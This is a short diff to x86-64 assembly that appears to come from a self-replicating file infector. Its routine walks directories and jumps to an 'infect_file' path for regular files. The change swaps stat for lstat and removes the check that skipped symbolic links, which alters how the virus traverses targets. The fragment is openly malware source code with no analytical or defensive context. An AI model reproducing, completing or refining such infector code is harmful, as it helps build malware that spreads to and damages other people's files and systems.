@@ -333,7 +333,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 		; check infect_dir or infect_file
 			sub rsp, 600
 
-			push SYSCALL_STAT
+			push SYSCALL_LSTAT
 			pop rax ; stat
 			mov rsi, rsp ; struct stat
 			syscall
@@ -366,8 +366,6 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			jmp .free_buffers
 			.infect:
-				cmp rax, S_IFLNK ; S_IFLNK
-				je .free_buffers
 				cmp rax, S_IFREG ; S_IFREG
 				je .infect_file
 				cmp rax, S_IFDIR ; S_IFDIR
